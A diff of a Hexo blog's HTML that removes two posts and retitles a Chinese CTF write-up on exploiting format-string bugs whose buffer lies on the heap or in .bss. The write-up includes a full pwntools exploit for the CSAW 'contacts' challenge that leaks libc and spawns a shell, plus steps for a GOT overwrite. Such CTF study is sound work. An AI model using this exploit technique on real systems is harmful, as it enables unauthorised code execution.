@@ -71,49 +71,10 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-fsf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/02/12/fsf/" class="article-date">
-  <time class="dt-published" datetime="2023-02-12T12:12:18.000Z" itemprop="datePublished">2023-02-12</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/02/12/fsf/">fsf</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p><img src="/2023/02/12/fsf/image-20230212201352085.png" alt="image-20230212201352085"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/02/12/fsf/" data-id="cle1clx2n00004ot9c9gpde66" data-title="fsf" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
     <article id="post-pwn" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2023/02/12/pwn/" class="article-date">
-  <time class="dt-published" datetime="2023-02-12T11:44:50.000Z" itemprop="datePublished">2023-02-12</time>
+  <time class="dt-published" datetime="2023-02-12T12:15:32.000Z" itemprop="datePublished">2023-02-12</time>
 </a>
     
   </div>
@@ -124,7 +85,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/02/12/pwn/">不在栈上的格式化字符串漏洞</a>
+      <a class="p-name article-title" href="/2023/02/12/pwn/">非栈上的格式化字符串漏洞</a>
     </h1>
   
 
@@ -134,14 +95,14 @@
       
         <h1 id="格式化字符串漏洞点不在栈上怎么打"><a href="#格式化字符串漏洞点不在栈上怎么打" class="headerlink" title="格式化字符串漏洞点不在栈上怎么打"></a>格式化字符串漏洞点不在栈上怎么打</h1><p><strong>一般在栈上的格式会字符串漏洞，我们可以先泄露导致格式化字符串漏洞的函数的got表，然后利用%$hhn进行一个一个byte的写入，payload自己可以写函数去生成，或者利用pwntools库的fmtstr_payload(,{:})去自动生成，自己构造payload要注意payload是否有被‘\x00’截断，导致利用不成功，这种方法需要我们可控值是存储在栈上的参数，不在栈上时应该怎么办？介绍两种方法</strong></p>
 <h2 id="第一种方法-将栈顶esp-rsp-提升到可控参数-进行rop"><a href="#第一种方法-将栈顶esp-rsp-提升到可控参数-进行rop" class="headerlink" title="第一种方法 将栈顶esp(rsp)提升到可控参数 进行rop"></a>第一种方法 将栈顶esp(rsp)提升到可控参数 进行rop</h2><p><strong>题目链接<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2015-CSAW-contacts">contacts</a></strong></p>
-<h3 id="拿到题目运行"><a href="#拿到题目运行" class="headerlink" title="拿到题目运行"></a>拿到题目运行</h3><p><img src="/.com//image-20230212164452297.png" alt="image-20230212164452297"></p>
-<h3 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h3><p><img src="/.com//image-20230212164600939.png" alt="image-20230212164600939"></p>
+<h3 id="拿到题目运行"><a href="#拿到题目运行" class="headerlink" title="拿到题目运行"></a>拿到题目运行</h3><p><img src="/2023/02/12/pwn/image-20230212164452297.png" alt="image-20230212164452297"></p>
+<h3 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h3><p><img src="/2023/02/12/pwn/image-20230212164600939.png" alt="image-20230212164600939"></p>
 <h3 id="开始ida反汇编静态分析"><a href="#开始ida反汇编静态分析" class="headerlink" title="开始ida反汇编静态分析"></a>开始ida反汇编静态分析</h3><p>主函数就是一下简单switch，PrintInfo发现有我们可控参数，format是我们输入的Description，但是很遗憾在堆上(可以看到是利用malloc在堆上申请)，源程序应该是个c的结构体</p>
-<p><img src="/.com//image-20230212164835416.png" alt="image-20230212164835416"></p>
-<p><img src="/.com//image-20230212170204473.png" alt="image-20230212170204473"></p>
+<p><img src="/2023/02/12/pwn/image-20230212164835416.png" alt="image-20230212164835416"></p>
+<p><img src="/2023/02/12/pwn/image-20230212170204473.png" alt="image-20230212170204473"></p>
 <p>这是我们的思路可能在想可不可以改写printf的got为system地址，让后控制format为‘&#x2F;bin&#x2F;sh’从而获取shell，很遗憾不可以，因为在printf(format)之前还是有在使用printf的，不合法的参数会造成程序崩溃，可不可以利用改写返回地址为system_addr + ‘fake’ + addr of ‘&#x2F;bin&#x2F;sh‘ ，思想可行，由于改写过程需要大量输出，行为不可行，但是思想终归是正确的，我们是否可以把system_addr + ‘fake’ + addr of ‘&#x2F;bin&#x2F;sh‘输入到description，再利用格式化字符串漏洞，把main函数返回时保存的ebp给为堆上description地址，是可行的</p>
 <h3 id="gdb动态调试写exp"><a href="#gdb动态调试写exp" class="headerlink" title="gdb动态调试写exp"></a>gdb动态调试写exp</h3><p>没有开pie保护，直接b *0x8048C22把断点下到漏洞处分析</p>
-<p><img src="/.com//image-20230212173223423.png" alt="image-20230212173223423"></p>
+<p><img src="/2023/02/12/pwn/image-20230212173223423.png" alt="image-20230212173223423"></p>
 <p>观察栈里的参数1处为PrintInfo函数保存的ebp地址，2处为description堆上地址，3处为__libc_start_call_main调用函数时保存的返回地址，利用fmtarg得到各格式化参数偏移，接下来我们的思路就很明确了</p>
 <ol>
 <li>利用%31$paaaa 泄露__libc_start_call_main，让后利用Libcsearch泄露版本号（ASLR保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变，原因是以页的大小为基础随机，linux一般4k），从而dump下libc里的system地址和&#x2F;bin&#x2F;sh地址，这里由于不知名原因导致__libc_start_call_main不行，脚本里换成了根据偏移libc_start_main地址，本地练习无所谓</li>
@@ -156,14 +117,14 @@
 <h3 id="完整exp如下"><a href="#完整exp如下" class="headerlink" title="完整exp如下"></a>完整exp如下</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./contacts&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createcontact</span>(<span class="params">name, phone, descrip_len, description</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Contact info: \n&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Name: &#x27;</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;You have 10 numbers\n&#x27;</span>)</span><br><span class="line">    io.sendline(phone)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Length of description: &#x27;</span>)</span><br><span class="line">    io.sendline(descrip_len)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;description:\n\t\t&#x27;</span>)</span><br><span class="line">    io.sendline(description)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printcontact</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Contacts:&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Description: &#x27;</span>)</span><br><span class="line"><span class="comment"># db(&#x27;b *0x8048C1F&#x27;)</span></span><br><span class="line">payload = <span class="string">&#x27;%31$paaaa&#x27;</span></span><br><span class="line">createcontact(<span class="string">b&#x27;1111&#x27;</span>, <span class="string">b&#x27;1111&#x27;</span>, <span class="string">b&#x27;111&#x27;</span>, payload)</span><br><span class="line">printcontact()</span><br><span class="line">__libc_start_call_main=<span class="built_in">int</span>(ru(<span class="string">b&#x27;aaaa&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;get libc_start_main_ret addr: &#x27;</span> + <span class="built_in">hex</span>(__libc_start_call_main))</span><br><span class="line">__libc_start_main=__libc_start_call_main+<span class="number">0x3B</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">base=__libc_start_main-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;system&#x27;</span>,system)</span><br><span class="line">p(<span class="string">&#x27;bin_sh&#x27;</span>,bin_sh)</span><br><span class="line">payload=<span class="string">b&#x27;%6$p%11$pbbb&#x27;</span>+p32(system)+<span class="string">b&#x27;fake&#x27;</span>+p32(bin_sh)</span><br><span class="line">createcontact(<span class="string">b&#x27;222&#x27;</span>,<span class="string">b&#x27;222&#x27;</span>,<span class="string">b&#x27;222&#x27;</span>,payload)</span><br><span class="line">printcontact()</span><br><span class="line">ru(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">data=ru(<span class="string">b&#x27;bbb&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">data=data.split(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">ebp_addr = <span class="built_in">int</span>(data[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(data[<span class="number">2</span>], <span class="number">16</span>)+<span class="number">12</span></span><br><span class="line">p(<span class="string">&#x27;ebp&#x27;</span>,ebp_addr)</span><br><span class="line">p(<span class="string">&#x27;heap&#x27;</span>,heap_addr)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(heap_addr-<span class="number">4</span>).encode()+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%6$n&#x27;</span></span><br><span class="line">createcontact(<span class="string">b&#x27;3333&#x27;</span>, <span class="string">b&#x27;123456789&#x27;</span>, <span class="string">b&#x27;300&#x27;</span>, payload)</span><br><span class="line">printcontact()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <h2 id="第二种方法-顺藤摸瓜修改栈上合适地址，改写got"><a href="#第二种方法-顺藤摸瓜修改栈上合适地址，改写got" class="headerlink" title="第二种方法 顺藤摸瓜修改栈上合适地址，改写got"></a>第二种方法 顺藤摸瓜修改栈上合适地址，改写got</h2><p>题目链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1lLW4_0WPbxhORpcDk5GLZw">https://pan.baidu.com/s/1lLW4_0WPbxhORpcDk5GLZw</a><br>提取码：qydx</p>
-<h3 id="拿到题目运行-1"><a href="#拿到题目运行-1" class="headerlink" title="拿到题目运行"></a>拿到题目运行</h3><p><img src="/.com//image-20230212181525295.png" alt="image-20230212181525295"></p>
-<h3 id="查看保护-1"><a href="#查看保护-1" class="headerlink" title="查看保护"></a>查看保护</h3><p><img src="/.com//image-20230212181617961.png" alt="image-20230212181617961"></p>
-<h3 id="ida反汇编静态分析"><a href="#ida反汇编静态分析" class="headerlink" title="ida反汇编静态分析"></a>ida反汇编静态分析</h3><p><img src="/.com//image-20230212181703467.png" alt="image-20230212181703467"></p>
+<h3 id="拿到题目运行-1"><a href="#拿到题目运行-1" class="headerlink" title="拿到题目运行"></a>拿到题目运行</h3><p><img src="/2023/02/12/pwn/image-20230212181525295.png" alt="image-20230212181525295"></p>
+<h3 id="查看保护-1"><a href="#查看保护-1" class="headerlink" title="查看保护"></a>查看保护</h3><p><img src="/2023/02/12/pwn/image-20230212181617961.png" alt="image-20230212181617961"></p>
+<h3 id="ida反汇编静态分析"><a href="#ida反汇编静态分析" class="headerlink" title="ida反汇编静态分析"></a>ida反汇编静态分析</h3><p><img src="/2023/02/12/pwn/image-20230212181703467.png" alt="image-20230212181703467"></p>
 <p>很明显的漏洞，发现buf在.bss段，同样不在栈区(.bss:未初始化的全局和静态C变量，以及所有被初始化为0的全局或静态变量。(目标文件该节在磁盘不占空间，在运行时，内存分配，初始化0))</p>
-<p><img src="/.com//image-20230212181831825.png" alt="image-20230212181831825"></p>
+<p><img src="/2023/02/12/pwn/image-20230212181831825.png" alt="image-20230212181831825"></p>
 <p>同样无法直接利用fmtstr_payload利用，这次我们观察程序发现这次程序在我们再次到底可控参数的printf没有使用printf，可以修改printf got为system地址，从而利用可控参数，拿到shell，由于可控参数在.bss段，我们就需要利用可控参数在原有栈的数据上做文章</p>
 <h3 id="gdb动态调试"><a href="#gdb动态调试" class="headerlink" title="gdb动态调试"></a>gdb动态调试</h3><p>输入%p后断点断到printf栈区如下</p>
-<p><img src="/.com//image-20230212184115485.png" alt="image-20230212184115485"></p>
+<p><img src="/2023/02/12/pwn/image-20230212184115485.png" alt="image-20230212184115485"></p>
 <p>利用1处栈地址，也就是将0xffffcfa8地址处内容0xffffcfb8修改为0xffffcfac，由于开启pie保护，0xffffcfac处所存内容是elf文件所存地址+pie基址生成的，got表也在elf文件的数据区，也是有地址+pie基地址生成，所以我们只需要利用%$hn修改其低四位即可(小端序)，buf地址可以利用%$p泄露，这样我们就可以输入buf为printf_got+payload，修改其got为system地址</p>
 <h3 id="exp构造"><a href="#exp构造" class="headerlink" title="exp构造"></a>exp构造</h3><ol>
 <li><p>%p%6$p泄露buf和ebp基地址</p>
@@ -179,7 +140,7 @@
 <li><p>%11$s\x00 利用布置好的printf_got泄露printf函数在libc里的真实地址 从而dump到system地址</p>
 </li>
 <li><p>改写printf_got为内容为system地址</p>
-<p><img src="/.com//image-20230212185436302.png" alt="image-20230212185436302"></p>
+<p><img src="/2023/02/12/pwn/image-20230212185436302.png" alt="image-20230212185436302"></p>
 </li>
 <li><p>由于两地址有3个字节的差异，一次%$hn只能改写2字节内容，而改写四字节内容需要的输出代价太大，我们需要在栈上找到另一个有价值的地址重复上面1.2.3.5步骤进行改写，改写其为printf_got地址的后两字节地址</p>
 </li>
@@ -193,58 +154,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/02/12/pwn/" data-id="cle1c5yuc0000d4t97kevfjz3" data-title="不在栈上的格式化字符串漏洞" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/02/12/hello-world/" class="article-date">
-  <time class="dt-published" datetime="2023-02-12T06:22:13.405Z" itemprop="datePublished">2023-02-12</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/02/12/hello-world/">Hello World</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/02/12/hello-world/" data-id="cle1c43wv0000hot911ene0g4" data-title="Hello World" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2023/02/12/pwn/" data-id="cle1c5yuc0000d4t97kevfjz3" data-title="非栈上的格式化字符串漏洞" class="article-share-link">Share</a>
       
       
       
@@ -287,15 +197,7 @@
       <ul>
         
           <li>
-            <a href="/2023/02/12/fsf/">fsf</a>
-          </li>
-        
-          <li>
-            <a href="/2023/02/12/pwn/">不在栈上的格式化字符串漏洞</a>
-          </li>
-        
-          <li>
-            <a href="/2023/02/12/hello-world/">Hello World</a>
+            <a href="/2023/02/12/pwn/">非栈上的格式化字符串漏洞</a>
           </li>
         
       </ul>
